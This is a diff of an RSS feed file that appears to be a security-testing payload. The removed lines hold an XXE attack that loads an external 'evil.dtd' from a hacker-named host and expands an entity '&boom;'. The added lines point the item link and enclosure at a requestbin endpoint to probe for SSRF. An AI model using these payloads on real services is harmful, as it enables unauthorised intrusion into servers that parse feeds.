@@ -1,14 +1,14 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE rss SYSTEM "https://hack1tak.github.io/rss/evil.dtd">
 <rss version="2.0">
   <channel>
-    <title>&boom;</title>
+    <title>SSRF Test</title>
     <link>http://example.com</link>
-    <description>Example feed</description>
+    <description>Testing SSRF via malicious URLs</description>
     <item>
-      <title>Injected Title</title>
-      <link>http://example.com/item</link>
-      <description>&boom;</description>
+      <title>SSRF Item</title>
+      <link>http://requestbin.whapi.cloud/1rjktsh1</link>
+      <enclosure url="http://requestbin.whapi.cloud/1rjktsh1" type="audio/mpeg"/>
+      <description>SSRF Test Description</description>
       <pubDate>Fri, 05 Sep 2025 12:00:00 GMT</pubDate>
     </item>
   </channel>
